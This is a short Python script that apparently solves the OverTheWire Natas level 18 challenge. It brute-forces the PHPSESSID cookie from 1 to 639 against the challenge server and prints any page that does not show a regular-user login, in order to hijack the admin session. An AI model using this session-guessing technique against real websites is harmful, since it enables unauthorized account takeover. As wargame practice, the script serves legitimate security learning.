"""
Help script to resolve natas challenge #18
"""
import requests
import json

level = 'natas18'
url = 'http://{}.natas.labs.overthewire.org/index.php'.format(level)
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
seen = ''
password = ''

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level we perform an attack against a poorly designed algorithm for generating the session ID.
We have to check 640 possible values for the variable PHPSESSID.
"""
for value in range(1, 640):
    # Request
    response = requests.post(url,
                             cookies={'PHPSESSID': str(value)},
                             auth=auth)
    if not 'You are logged in as a regular user.' in response.text:
        print(response.text)

